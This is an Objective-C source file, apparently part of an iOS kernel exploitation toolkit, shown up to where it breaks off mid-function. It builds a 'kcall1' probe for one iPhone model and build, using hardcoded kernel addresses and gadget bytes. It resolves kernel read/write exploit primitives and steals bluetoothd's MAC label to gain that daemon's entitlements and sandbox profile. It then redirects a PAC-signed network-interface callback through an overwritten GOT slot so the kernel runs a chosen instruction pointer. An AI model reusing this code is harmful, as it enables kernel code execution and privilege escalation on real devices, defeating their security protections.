#import "CNDPhysicalKCall1Probe.h"

#import <IOKit/IOCFSerialize.h>
#import <IOKit/IOKitLib.h>
#import <objc/message.h>

#include <errno.h>
#include <dlfcn.h>
#include <mach-o/loader.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/sysctl.h>
#include <unistd.h>

@protocol CNDPhysicalKCall1MetalBuffer <NSObject>
- (void *)contents;
- (uint64_t)gpuAddress;
@end

@protocol CNDPhysicalKCall1MetalDevice <NSObject>
- (id<CNDPhysicalKCall1MetalBuffer>)newBufferWithLength:(NSUInteger)length
                                                options:(NSUInteger)options;
@end

/*
 * Phone-side kcall1 chosen-PC / chosen-X0 canary.
 *
 * This is the in-process physical port of the producer's
 * `--ifnet-kcall1-pac-canary` mode (scripts/lab/cnd_iouserethernet_krw_trigger.m
 * CNDRunIfnetKCall1PACCanary).  It uses only the app's own kexploit KRW
 * (kreadbuf / kwrite64 / kexploit_early_kwrite32bytes_checked) with the base
 * from g_kernel_base / g_kernel_slide: no provider socket, no root, no host
 * process, and never the VM-only kcall backend (cnd_lab_kernel_call /
 * syscall 439).
 *
 * The canary proves that a PAC-signed callback the kernel itself produced can
 * be re-pointed so that a kernel-context call executes a chosen PC with a
 * chosen X0:
 *
 *   1. The IOEthernetInterface `check_multi` GOT slot
 *      (__got, static 0xfffffff0080b4020) is confirmed to hold the stock
 *      `ether_check_multi` pointer.
 *   2. The three borrowed stubs are confirmed byte-for-byte against the
 *      pinned phone kernelcache:
 *        load_w0_from_x0 0xfffffff008a4b130  bti c; ldr w0,[x0]; ret
 *        enoexec_return  0xfffffff008a4b5d8  bti c; mov w0,#8; ret
 *        ifnet_x0_dispatcher 0xfffffff00a6e759c
 *            bti c; ldr x16,[x0,#0xb0]; cbz x16,+0x10; ldr x0,[x0,#0x90];
 *            mov x17,#0xe4fe; braa x16,x17; ret
 *   3. Each `IOUserEthernetResource` selector-0 call (entitlement-gated,
 *      authorized with bluetoothd's borrowed MAC label) creates an
 *      IOUserEthernetInterface whose `ifnet` receives a *freshly signed*
 *      `check_multi` callback for whichever target the GOT held during the
 *      call (initIfnetParams+0x1b8: ldr x16,[x16,#0x20]; mov x17,#0xe4fe;
 *      pacia x16,x17).  Three interfaces are created, harvesting signed
 *      callbacks for the stock target, the load stub and the dispatcher.
 *   4. On the dispatcher's backing ifnet the chain is staged - target field
 *      = the signed load stub, X0 field = the GOT address, callback field =
 *      the signed dispatcher - and the GOT is armed with the EINPROGRESS
 *      marker.
 *   5. SIOCADDMULTI on that interface reaches check_multi, which branches
 *      through the dispatcher with x0 = the GOT address, `braa`'s to the
 *      signed load stub and returns the marker, so the ioctl fails with
 *      errno EINPROGRESS: proof that the chosen PC ran with the chosen X0.
 *   6. Every field and the GOT are restored and read back before the verdict.
 *
 * Address provenance and the load-stub reconciliation:
 * docs/research/kcall1-phone-derivation-20261016/README.md and
 * load-stub-reconciliation.txt.  All seven role addresses below are derived
 * from the pinned iPhone17,2 23A341 kernelcache
 * (build/lab-cs-allow-invalid/kernel-23A341/...), never scanned or guessed.
 */

enum {
    CNDPhysicalKCall1LabelSize = 0x20,
    CNDPhysicalKCall1AMFISlotOffset = 0x8,
    CNDPhysicalKCall1SandboxSlotOffset = 0x10,
    /* ipc_port -> IONetworkInterface object wrapper, when the app's
     * ip_kobject offset lands on the wrapper rather than the object. */
    CNDPhysicalKCall1IOMachPortObjectOffset = 0x20,
    CNDPhysicalKCall1InterfaceBackingIfnetOffset = 0x90,
    CNDPhysicalKCall1IfnetX0Offset = 0x90,
    CNDPhysicalKCall1IfnetTargetOffset = 0xb0,
    /* The legacy kcall path used +0x238 here.  Live inventory plus the pinned
     * XNU field order identifies +0x238 as if_output and +0x2b8 as the
     * if_proto_hash pointer; if_check_multi is at +0x2a8.  Keep this separate
     * until the quarantined mutating path is re-derived end to end. */
    CNDPhysicalKCall1IfnetCheckMultiOffset = 0x238,
    CNDPhysicalKCall1InventoryIfnetCheckMultiOffset = 0x2a8,
    CNDPhysicalKCall1InventoryIfnetProtoHashCountOffset = 0x2b0,
    CNDPhysicalKCall1InventoryIfnetProtoHashOffset = 0x2b8,
};

#define CND_PHYSICAL_KCALL1_EXPECTED_PRODUCT "iPhone17,2"
#define CND_PHYSICAL_KCALL1_EXPECTED_BUILD "23A341"
#define CND_PHYSICAL_KCALL1_OBJECT_MIN UINT64_C(0xffffffdc00000000)
#define CND_PHYSICAL_KCALL1_OBJECT_MAX UINT64_C(0xfffffffbffffffff)
#define CND_PHYSICAL_KCALL1_VIRTUAL_MIN UINT64_C(0xfffffe0000000000)
#define CND_PHYSICAL_KCALL1_VIRTUAL_MAX UINT64_C(0xfffffffffffffff8)
#define CND_PHYSICAL_KCALL1_SLIDE_MAX UINT64_C(0x100000000)
#define CND_PHYSICAL_KCALL1_MAX_POLLS 60U
#define CND_PHYSICAL_KCALL1_POLL_INTERVAL_US 50000U

/* iPhone17,2 23A341 pre-slide statics (container __TEXT base first). */
static const uint64_t CNDPhysicalKCall1StaticKernelBase =
    UINT64_C(0xfffffff007004000);
static const uint64_t CNDPhysicalKCall1StaticFilesetEntry =
    UINT64_C(0xfffffff00700c000);
static const uint64_t CNDPhysicalKCall1StaticCheckMultiGOT =
    UINT64_C(0xfffffff0080b4020);
static const uint64_t CNDPhysicalKCall1StaticEtherCheckMulti =
    UINT64_C(0xfffffff00849044c);
static const uint64_t CNDPhysicalKCall1StaticInitIfnetParams =
    UINT64_C(0xfffffff00a6da548);
static const uint64_t CNDPhysicalKCall1StaticCheckMultiSigner =
    UINT64_C(0xfffffff00a6da700);
static const uint64_t CNDPhysicalKCall1StaticEnoexecReturn =
    UINT64_C(0xfffffff008a4b5d8);
static const uint64_t CNDPhysicalKCall1StaticLoadW0FromX0 =
    UINT64_C(0xfffffff008a4b130);
static const uint64_t CNDPhysicalKCall1StaticIfnetX0Dispatcher =
    UINT64_C(0xfffffff00a6e759c);

/* Read-only UAT PTE probe adapters.  Each indirect hop uses the same IA-key
 * discriminator (0xe4fe) as ifnet's check_multi callback. */
static const uint64_t CNDPhysicalKCall1StaticAPFSX1Dispatcher =
    UINT64_C(0xfffffff00ae749d8);
static const uint64_t CNDPhysicalKCall1StaticIOUATGetPTE =
    UINT64_C(0xfffffff0089f436c);
static const uint64_t CNDPhysicalKCall1StaticIOUATGlobal =
    UINT64_C(0xfffffff00b3934f8);

/* Byte-exact stubs, dumped from the pinned phone kernelcache. */
static const uint32_t CNDPhysicalKCall1ExpectedEnoexec[3] = {
    UINT32_C(0xd503245f), UINT32_C(0x52800100), UINT32_C(0xd65f03c0),
};
static const uint32_t CNDPhysicalKCall1ExpectedLoad[3] = {
    UINT32_C(0xd503245f), UINT32_C(0xb9400000), UINT32_C(0xd65f03c0),
};
static const uint32_t CNDPhysicalKCall1ExpectedDispatcher[7] = {
    UINT32_C(0xd503245f), UINT32_C(0xf9405810),
    UINT32_C(0xb4000090), UINT32_C(0xf9404800),
    UINT32_C(0xd29c9fd1), UINT32_C(0xd71f0a11),
    UINT32_C(0xd65f03c0),
};
static const uint32_t CNDPhysicalKCall1ExpectedAPFSX1Dispatcher[4] = {
    UINT32_C(0xd503245f), UINT32_C(0xa9400430),
    UINT32_C(0xd29c9fd1), UINT32_C(0xd71f0a11),
};
static const uint32_t CNDPhysicalKCall1ExpectedIOUATGetPTE[8] = {
    UINT32_C(0xd503237f), UINT32_C(0xd10183ff),
    UINT32_C(0xa90357f6), UINT32_C(0xa9044ff4),
    UINT32_C(0xa9057bfd), UINT32_C(0x910143fd),
    UINT32_C(0xaa0103f3), UINT32_C(0xaa0003f4),
};
static const uint32_t CNDPhysicalKCall1ExpectedCheckMultiSigner[3] = {
    UINT32_C(0xd29c9fd1), /* mov x17, #0xe4fe */
    UINT32_C(0xdac10230), /* pacia x16, x17 */
    UINT32_C(0xf9002670), /* str x16, [x19, #0x48] */
};

typedef struct {
    uint64_t target;
    uint64_t slot;
    uint32_t instructions[7];
    const char *name;
} CNDPhysicalKCall1GlobalDispatcher;

/* One candidate covers each possible low-16-bit value of the 16 KiB-aligned
 * kernel slide.  Runtime selection additionally requires that the signed
 * target encode sa_family AF_UNSPEC (0) or AF_LINK (18), that all seven
 * instructions match, and that the callback slot is idle (zero). */
static const CNDPhysicalKCall1GlobalDispatcher
CNDPhysicalKCall1GlobalDispatchers[] = {
    { UINT64_C(0xfffffff009551224), UINT64_C(0xfffffff00b44ace0),
      { 0xd503245f, 0xb000f7c8, 0x91338108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleIDAMInterface" },
    { UINT64_C(0xfffffff009c392b8), UINT64_C(0xfffffff00b495698),
      { 0xd503245f, 0x9000c2e8, 0x911a6108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleT8110DART" },
    { UINT64_C(0xfffffff009f05200), UINT64_C(0xfffffff00b4cb2e0),
      { 0xd503245f, 0xd000ae28, 0x910b8108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleTypeCPhyAUSBC" },
    { UINT64_C(0xfffffff00a570014), UINT64_C(0xfffffff00b4db960),
      { 0xd503245f, 0xf0007b48, 0x91258108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "DiskImages" },
    { UINT64_C(0xfffffff009fcc004), UINT64_C(0xfffffff00b4ccde0),
      { 0xd503245f, 0x9000a808, 0x91378108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "usb.networking" },
    { UINT64_C(0xfffffff0095f8020), UINT64_C(0xfffffff00b44ed60),
      { 0xd503245f, 0xd000f2a8, 0x91358108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleLockdownMode" },
    { UINT64_C(0xfffffff00a01400c), UINT64_C(0xfffffff00b4cd940),
      { 0xd503245f, 0xb000a5c8, 0x91250108, 0xf9400110,
        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "CoreAnalyticsFamily" },
};

typedef uint64_t (*CNDPhysicalKCall1ProcFindByNameFn)(const char *name);
typedef uint64_t (*CNDPhysicalKCall1ProcSelfFn)(void);
typedef uint64_t (*CNDPhysicalKCall1ProcGetCredLabelFn)(uint64_t proc);
typedef uint64_t (*CNDPhysicalKCall1AmfiCslotGetFn)(uint64_t label);
typedef uint64_t (*CNDPhysicalKCall1LabelGetSandboxFn)(uint64_t label);
typedef void (*CNDPhysicalKCall1KReadBufFn)(uint64_t address, void *buffer,
    uint64_t length);
typedef uint64_t (*CNDPhysicalKCall1KRead64Fn)(uint64_t address);
typedef void (*CNDPhysicalKCall1KWrite64Fn)(uint64_t address,
    uint64_t value);
typedef bool (*CNDPhysicalKCall1KWrite32BytesCheckedFn)(uint64_t address,
    const uint8_t bytes[CNDPhysicalKCall1LabelSize]);
typedef int (*CNDPhysicalKCall1KexploitFn)(void);
typedef bool (*CNDPhysicalKCall1KRWReadyFn)(void);
typedef bool (*CNDPhysicalKCall1KRWCleanupFn)(void);
typedef void (*CNDPhysicalKCall1OffsetsInitFn)(void);
typedef uint64_t (*CNDPhysicalKCall1TaskSelfFn)(void);
typedef uint64_t (*CNDPhysicalKCall1TaskGetKobjectFn)(uint64_t task,
    mach_port_t port);

typedef CFMutableDictionaryRef (*CNDPhysicalKCall1ServiceMatchingFn)(
    const char *name);
typedef io_service_t (*CNDPhysicalKCall1GetMatchingServiceFn)(
    mach_port_t mainPort, CFDictionaryRef matching);
typedef kern_return_t (*CNDPhysicalKCall1GetMatchingServicesFn)(
    mach_port_t mainPort, CFDictionaryRef matching, io_iterator_t *iterator);
typedef io_object_t (*CNDPhysicalKCall1IteratorNextFn)(io_iterator_t iterator);
typedef kern_return_t (*CNDPhysicalKCall1ObjectReleaseFn)(io_object_t object);
typedef kern_return_t (*CNDPhysicalKCall1ServiceOpenFn)(io_service_t service,
    task_port_t owningTask, uint32_t type, io_connect_t *connection);
typedef kern_return_t (*CNDPhysicalKCall1ServiceCloseFn)(
    io_connect_t connection);
typedef kern_return_t (*CNDPhysicalKCall1ConnectCallMethodFn)(
    mach_port_t connection, uint32_t selector,
    const uint64_t *input, uint32_t inputCount,
    const void *inputStruct, size_t inputStructCount,
    uint64_t *output, uint32_t *outputCount,
    void *outputStruct, size_t *outputStructCount);
typedef kern_return_t (*CNDPhysicalKCall1RegistryIDFn)(
    io_registry_entry_t entry, uint64_t *entryID);
typedef CFTypeRef (*CNDPhysicalKCall1RegistryPropertyFn)(
    io_registry_entry_t entry, CFStringRef key,
    CFAllocatorRef allocator, IOOptionBits options);
typedef kern_return_t (*CNDPhysicalKCall1RegistryPathFn)(
    io_registry_entry_t entry, const io_name_t plane, io_string_t path);
typedef CFDataRef (*CNDPhysicalKCall1SerializeFn)(
    CFTypeRef object, CFOptionFlags options);

typedef struct {
    CNDPhysicalKCall1ProcFindByNameFn procFindByName;
    CNDPhysicalKCall1ProcSelfFn procSelf;
    CNDPhysicalKCall1ProcGetCredLabelFn procGetCredLabel;
    CNDPhysicalKCall1AmfiCslotGetFn amfiCslotGet;
    CNDPhysicalKCall1LabelGetSandboxFn labelGetSandbox;
    CNDPhysicalKCall1KReadBufFn kreadbuf;
    CNDPhysicalKCall1KRead64Fn kread64;
    CNDPhysicalKCall1KWrite64Fn kwrite64;
    CNDPhysicalKCall1KWrite32BytesCheckedFn write32BytesChecked;
    CNDPhysicalKCall1KexploitFn kexploit;
    CNDPhysicalKCall1KRWReadyFn krwReady;
    CNDPhysicalKCall1KRWCleanupFn krwCleanup;
    CNDPhysicalKCall1OffsetsInitFn offsetsInit;
    CNDPhysicalKCall1TaskSelfFn taskSelf;
    CNDPhysicalKCall1TaskGetKobjectFn taskGetKobject;
    uint64_t *kernelBase;
    uint64_t *kernelSlide;
    uint32_t *amfiSlotOffset;
    uint32_t *sandboxSlotOffset;
} CNDPhysicalKCall1KernelAPI;

typedef struct {
    void *handle;
    CNDPhysicalKCall1ServiceMatchingFn serviceMatching;
    CNDPhysicalKCall1GetMatchingServiceFn getMatchingService;
    CNDPhysicalKCall1GetMatchingServicesFn getMatchingServices;
    CNDPhysicalKCall1IteratorNextFn iteratorNext;
    CNDPhysicalKCall1ObjectReleaseFn objectRelease;
    CNDPhysicalKCall1ServiceOpenFn serviceOpen;
    CNDPhysicalKCall1ServiceCloseFn serviceClose;
    CNDPhysicalKCall1ConnectCallMethodFn connectCallMethod;
    CNDPhysicalKCall1RegistryIDFn registryID;
    CNDPhysicalKCall1RegistryPropertyFn registryProperty;
    CNDPhysicalKCall1RegistryPathFn registryPath;
    CNDPhysicalKCall1SerializeFn serialize;
} CNDPhysicalKCall1IOKitAPI;

typedef struct {
    uint64_t targetLabel;
    uint64_t donorLabel;
    uint64_t originalAMFIObject;
    uint64_t donorAMFIObject;
    uint64_t originalSandboxObject;
    uint64_t donorSandboxObject;
    uint8_t originalLabel[CNDPhysicalKCall1LabelSize];
    uint8_t borrowedLabel[CNDPhysicalKCall1LabelSize];
    uint8_t labelAfterWrite[CNDPhysicalKCall1LabelSize];
    bool captured;
    bool writeAttempted;
    bool installed;
    bool restored;
    /* Diagnosis for a refused borrow.  The socket writer returns only a
     * bool and also returns false when its post-write park fails, so the
     * bytes are read back even on refusal: unchanged bytes mean the write
     * never landed, while changed-but-unverified bytes mean it landed and
     * only the writer's own verification failed. */
    bool writeAccepted;
    int writeError;
    bool labelAfterWriteCaptured;
    bool labelMatchesDesired;
    bool labelChanged;
} CNDPhysicalKCall1Borrow;

typedef struct {
    char bsdName[IFNAMSIZ];
    uint64_t registryID;
    uint64_t interfaceObject;
    uint64_t backingIfnet;
    uint64_t signedCallback;
    uint64_t callbackTarget;
    uint64_t controllerCookie;
    kern_return_t callKR;
    int readbackResult;
} CNDPhysicalKCall1SignedInterface;

typedef struct {
    uint64_t gotAddress;
    uint64_t originalRaw;
    uint64_t originalTarget;
    bool originalIsPACSigned;
    uint64_t canaryTarget;
    bool ready;
    bool installed;
    bool restored;
} CNDPhysicalKCall1Canary;

typedef NS_ENUM(uint8_t, CNDPhysicalKCall1ProbeMode) {
    CNDPhysicalKCall1ProbeModeChosenPC,
    CNDPhysicalKCall1ProbeModeUatPTE,
    CNDPhysicalKCall1ProbeModeSignerOracle,
};

static volatile int32_t gCNDPhysicalKCall1ProbeRunning;

static NSString *CNDPhysicalKCall1Hex(uint64_t value)
{
    return [NSString stringWithFormat:@"0x%016llx",
        (unsigned long long)value];
}

static NSString *CNDPhysicalKCall1SysctlString(const char *name)
{
    char value[128] = {0};
    size_t size = sizeof(value);
    if (sysctlbyname(name, value, &size, NULL, 0) != 0 || value[0] == '\0') {
        return @"";
    }
    return [NSString stringWithUTF8String:value] ?: @"";
}

static bool CNDPhysicalKCall1KernelObject(uint64_t value)
{
    return value >= CND_PHYSICAL_KCALL1_OBJECT_MIN &&
        value <= CND_PHYSICAL_KCALL1_OBJECT_MAX &&
        (value & UINT64_C(0x7)) == 0;
}

static bool CNDPhysicalKCall1VirtualAddress(uint64_t value)
{
    return value >= CND_PHYSICAL_KCALL1_VIRTUAL_MIN &&
        value < CND_PHYSICAL_KCALL1_VIRTUAL_MAX &&
        (value & UINT64_C(0x3)) == 0;
}

/* Exact PAC strips, same instructions the producer uses. */
__attribute__((naked))
static uint64_t CNDPhysicalKCall1StripDataPointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac147e0"); /* xpacd x0 */
    __asm__ volatile("ret");
}

__attribute__((naked))
static uint64_t CNDPhysicalKCall1StripInstructionPointer(uint64_t value)
{
    __asm__ volatile(".long 0xdac143e0"); /* xpaci x0 */
    __asm__ volatile("ret");
}

static void CNDPhysicalKCall1Persist(
    NSMutableDictionary<NSString *, id> *report, NSString *path,
    NSString *key, id value)
{
    if (key != nil && value != nil) report[key] = value;
    report[@"updatedAt"] = @([[NSDate date] timeIntervalSince1970]);
    NSData *data = [NSJSONSerialization dataWithJSONObject:report
        options:NSJSONWritingPrettyPrinted | NSJSONWritingSortedKeys
        error:nil];
    if (data != nil && path != nil) {
        (void)[data writeToFile:path options:NSDataWritingAtomic error:nil];
    }
    if (key != nil) {
        NSLog(@"[CND_KCALL1] %@=%@", key, value);
    }
}

static bool CNDPhysicalKCall1ResolveKernelAPI(
    CNDPhysicalKCall1KernelAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
#define CND_KCALL1_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
    CND_KCALL1_RESOLVE(procFindByName, "proc_find_by_name");
    CND_KCALL1_RESOLVE(procSelf, "proc_self");
    CND_KCALL1_RESOLVE(procGetCredLabel, "proc_get_cred_label");
    CND_KCALL1_RESOLVE(amfiCslotGet, "amfi_cslot_get");
    CND_KCALL1_RESOLVE(labelGetSandbox, "label_get_sandbox");
    CND_KCALL1_RESOLVE(kreadbuf, "kreadbuf");
    CND_KCALL1_RESOLVE(kread64, "kread64");
    CND_KCALL1_RESOLVE(kwrite64, "kwrite64");
    CND_KCALL1_RESOLVE(write32BytesChecked,
        "kexploit_early_kwrite32bytes_checked");
    CND_KCALL1_RESOLVE(kexploit, "kexploit_opa334");
    CND_KCALL1_RESOLVE(krwReady, "kexploit_krw_ready");
    CND_KCALL1_RESOLVE(krwCleanup, "kexploit_terminal_cleanup");
    CND_KCALL1_RESOLVE(offsetsInit, "offsets_init");
    CND_KCALL1_RESOLVE(taskSelf, "task_self");
    CND_KCALL1_RESOLVE(taskGetKobject, "task_get_ipc_port_kobject");
    CND_KCALL1_RESOLVE(kernelBase, "g_kernel_base");
    CND_KCALL1_RESOLVE(kernelSlide, "g_kernel_slide");
    CND_KCALL1_RESOLVE(amfiSlotOffset, "off_label_l_perpolicy_amfi");
    CND_KCALL1_RESOLVE(sandboxSlotOffset,
        "off_label_l_perpolicy_sandbox");
#undef CND_KCALL1_RESOLVE
    return api->procFindByName != NULL && api->procSelf != NULL &&
        api->procGetCredLabel != NULL && api->kreadbuf != NULL &&
        api->kread64 != NULL && api->kwrite64 != NULL &&
        api->write32BytesChecked != NULL && api->kexploit != NULL &&
        api->krwReady != NULL && api->krwCleanup != NULL &&
        api->offsetsInit != NULL &&
        api->taskSelf != NULL && api->taskGetKobject != NULL &&
        api->kernelBase != NULL && api->kernelSlide != NULL &&
        api->amfiSlotOffset != NULL && api->sandboxSlotOffset != NULL;
}

/* Deliberately resolves no write, acquisition, cleanup, label or process
 * helpers.  The signer inventory is allowed to consume only an already-live
 * KRW generation. */
static bool CNDPhysicalKCall1ResolveReadOnlyKernelAPI(
    CNDPhysicalKCall1KernelAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
#define CND_KCALL1_RO_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
    CND_KCALL1_RO_RESOLVE(kreadbuf, "kreadbuf");
    CND_KCALL1_RO_RESOLVE(krwReady, "kexploit_krw_ready");
    CND_KCALL1_RO_RESOLVE(taskSelf, "task_self");
    CND_KCALL1_RO_RESOLVE(taskGetKobject, "task_get_ipc_port_kobject");
    CND_KCALL1_RO_RESOLVE(kernelBase, "g_kernel_base");
    CND_KCALL1_RO_RESOLVE(kernelSlide, "g_kernel_slide");
#undef CND_KCALL1_RO_RESOLVE
    return api->kreadbuf != NULL && api->krwReady != NULL &&
        api->taskSelf != NULL && api->taskGetKobject != NULL &&
        api->kernelBase != NULL && api->kernelSlide != NULL;
}

static bool CNDPhysicalKCall1ResolveIOKitAPI(CNDPhysicalKCall1IOKitAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
    api->handle = dlopen(
        "/System/Library/Frameworks/IOKit.framework/IOKit",
        RTLD_NOW | RTLD_LOCAL);
    if (api->handle == NULL) return false;
#define CND_KCALL1_IOKIT_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(api->handle, name)
    CND_KCALL1_IOKIT_RESOLVE(serviceMatching, "IOServiceMatching");
    CND_KCALL1_IOKIT_RESOLVE(getMatchingService,
        "IOServiceGetMatchingService");
    CND_KCALL1_IOKIT_RESOLVE(getMatchingServices,
        "IOServiceGetMatchingServices");
    CND_KCALL1_IOKIT_RESOLVE(iteratorNext, "IOIteratorNext");
    CND_KCALL1_IOKIT_RESOLVE(objectRelease, "IOObjectRelease");
    CND_KCALL1_IOKIT_RESOLVE(serviceOpen, "IOServiceOpen");
    CND_KCALL1_IOKIT_RESOLVE(serviceClose, "IOServiceClose");
    CND_KCALL1_IOKIT_RESOLVE(connectCallMethod, "IOConnectCallMethod");
    CND_KCALL1_IOKIT_RESOLVE(registryID,
        "IORegistryEntryGetRegistryEntryID");
    CND_KCALL1_IOKIT_RESOLVE(registryProperty,
        "IORegistryEntryCreateCFProperty");
    CND_KCALL1_IOKIT_RESOLVE(registryPath, "IORegistryEntryGetPath");
    CND_KCALL1_IOKIT_RESOLVE(serialize, "IOCFSerialize");
#undef CND_KCALL1_IOKIT_RESOLVE
    return api->serviceMatching != NULL &&
        api->getMatchingService != NULL &&
        api->getMatchingServices != NULL && api->iteratorNext != NULL &&
        api->objectRelease != NULL && api->serviceOpen != NULL &&
        api->serviceClose != NULL && api->connectCallMethod != NULL &&
        api->registryID != NULL && api->registryProperty != NULL &&
        api->registryPath != NULL && api->serialize != NULL;
}

/* Registry-only IOKit surface for the signer inventory.  In particular this
 * omits IOServiceOpen and IOConnectCallMethod. */
static bool CNDPhysicalKCall1ResolveReadOnlyIOKitAPI(
    CNDPhysicalKCall1IOKitAPI *api)
{
    if (api == NULL) return false;
    memset(api, 0, sizeof(*api));
    api->handle = dlopen(
        "/System/Library/Frameworks/IOKit.framework/IOKit",
        RTLD_NOW | RTLD_LOCAL);
    if (api->handle == NULL) return false;
#define CND_KCALL1_RO_IOKIT_RESOLVE(field, name) \
    api->field = (__typeof__(api->field))dlsym(api->handle, name)
    CND_KCALL1_RO_IOKIT_RESOLVE(serviceMatching, "IOServiceMatching");
    CND_KCALL1_RO_IOKIT_RESOLVE(getMatchingServices,
        "IOServiceGetMatchingServices");
    CND_KCALL1_RO_IOKIT_RESOLVE(iteratorNext, "IOIteratorNext");
    CND_KCALL1_RO_IOKIT_RESOLVE(objectRelease, "IOObjectRelease");
    CND_KCALL1_RO_IOKIT_RESOLVE(registryID,
        "IORegistryEntryGetRegistryEntryID");
    CND_KCALL1_RO_IOKIT_RESOLVE(registryProperty,
        "IORegistryEntryCreateCFProperty");
    CND_KCALL1_RO_IOKIT_RESOLVE(registryPath, "IORegistryEntryGetPath");
#undef CND_KCALL1_RO_IOKIT_RESOLVE
    return api->serviceMatching != NULL &&
        api->getMatchingServices != NULL && api->iteratorNext != NULL &&
        api->objectRelease != NULL && api->registryID != NULL &&
        api->registryProperty != NULL && api->registryPath != NULL;
}

static bool CNDPhysicalKCall1ReadBytes(const CNDPhysicalKCall1KernelAPI *api,
    uint64_t address, void *buffer, size_t length)
{
    if (api == NULL || api->kreadbuf == NULL || buffer == NULL ||
        length == 0) return false;
    api->kreadbuf(address, buffer, (uint64_t)length);
    return true;
}

static bool CNDPhysicalKCall1ReadU64(const CNDPhysicalKCall1KernelAPI *api,
    uint64_t address, uint64_t *valueOut)
{
    if (valueOut == NULL) return false;
    *valueOut = 0;
    return CNDPhysicalKCall1ReadBytes(api, address, valueOut,
        sizeof(*valueOut));
}

static bool CNDPhysicalKCall1WriteU64Verify(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t address,
    uint64_t desired)
{
    if (api == NULL || api->kwrite64 == NULL) return false;
    api->kwrite64(address, desired);
    uint64_t observed = 0;
    return CNDPhysicalKCall1ReadU64(api, address, &observed) &&
        observed == desired;
}

static bool CNDPhysicalKCall1RestoreU64(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t address,
    uint64_t original)
{
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDPhysicalKCall1WriteU64Verify(api, address, original)) {
            return true;
        }
    }
    return false;
}

static bool CNDPhysicalKCall1ReadLabel(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t label,
    uint8_t bytes[CNDPhysicalKCall1LabelSize])
{
    if (api == NULL || bytes == NULL ||
        !CNDPhysicalKCall1KernelObject(label)) return false;
    memset(bytes, 0, CNDPhysicalKCall1LabelSize);
    return CNDPhysicalKCall1ReadBytes(api, label, bytes,
        CNDPhysicalKCall1LabelSize);
}

static bool CNDPhysicalKCall1WriteAndVerifyLabel(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t label,
    const uint8_t desired[CNDPhysicalKCall1LabelSize],
    CNDPhysicalKCall1Borrow *diagnosis)
{
    if (diagnosis != NULL) {
        diagnosis->writeAccepted = false;
        diagnosis->writeError = 0;
        diagnosis->labelAfterWriteCaptured = false;
        diagnosis->labelMatchesDesired = false;
        diagnosis->labelChanged = false;
    }
    if (api == NULL || api->write32BytesChecked == NULL || desired == NULL ||
        !CNDPhysicalKCall1KernelObject(label)) return false;
    errno = 0;
    bool accepted = api->write32BytesChecked(label, desired);
    int writeError = errno;
    uint8_t observed[CNDPhysicalKCall1LabelSize] = {0};
    bool captured = CNDPhysicalKCall1ReadLabel(api, label, observed);
    if (diagnosis != NULL) {
        diagnosis->writeAccepted = accepted;
        diagnosis->writeError = accepted ? 0 : writeError;
        memcpy(diagnosis->labelAfterWrite, observed, sizeof(observed));
        diagnosis->labelAfterWriteCaptured = captured;
        diagnosis->labelMatchesDesired = captured &&
            memcmp(observed, desired, sizeof(observed)) == 0;
        /* "Changed" means changed from the *original* label image, not from
         * the desired one: unchanged bytes prove the write never landed. */
        diagnosis->labelChanged = captured && diagnosis->captured &&
            memcmp(observed, diagnosis->originalLabel,
                sizeof(observed)) != 0;
    }
    return accepted && captured &&
        memcmp(observed, desired, sizeof(observed)) == 0;
}

static bool CNDPhysicalKCall1RestoreLabel(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t label,
    const uint8_t original[CNDPhysicalKCall1LabelSize])
{
    uint8_t observed[CNDPhysicalKCall1LabelSize] = {0};
    if (CNDPhysicalKCall1ReadLabel(api, label, observed) &&
        memcmp(observed, original, sizeof(observed)) == 0) {
        return true;
    }
    for (unsigned int attempt = 0; attempt < 3; attempt++) {
        if (CNDPhysicalKCall1WriteAndVerifyLabel(api, label, original, NULL)) {
            return true;
        }
    }
    memset(observed, 0, sizeof(observed));
    return CNDPhysicalKCall1ReadLabel(api, label, observed) &&
        memcmp(observed, original, sizeof(observed)) == 0;
}

/*
 * Borrow the donor's MAC-label objects into this process's own label.  Both
 * gate policies the sibling signer probe uses are borrowed: the AMFI
 * OSEntitlements object (label+0x8) that authorizes the
 * com.apple.networking.ethernet.user-access entitlement, and the Seatbelt
 * sandbox object (label+0x10).  The whole 0x20-byte label is rewritten in one
 * checked 32-byte write and restored exactly after the open.
 */
static bool CNDPhysicalKCall1PrepareBorrow(
    const CNDPhysicalKCall1KernelAPI *api, uint64_t donorProc,
    uint64_t targetProc, CNDPhysicalKCall1Borrow *borrow)
{
    if (api == NULL || borrow == NULL || donorProc == targetProc ||
        !CNDPhysicalKCall1KernelObject(donorProc) ||
        !CNDPhysicalKCall1KernelObject(targetProc) ||
        *api->amfiSlotOffset != CNDPhysicalKCall1AMFISlotOffset ||
        *api->sandboxSlotOffset != CNDPhysicalKCall1SandboxSlotOffset) {
        return false;
    }
    memset(borrow, 0, sizeof(*borrow));
    borrow->donorLabel = api->procGetCredLabel(donorProc);
    borrow->targetLabel = api->procGetCredLabel(targetProc);
    if (!CNDPhysicalKCall1KernelObject(borrow->donorLabel) ||
        !CNDPhysicalKCall1KernelObject(borrow->targetLabel) ||
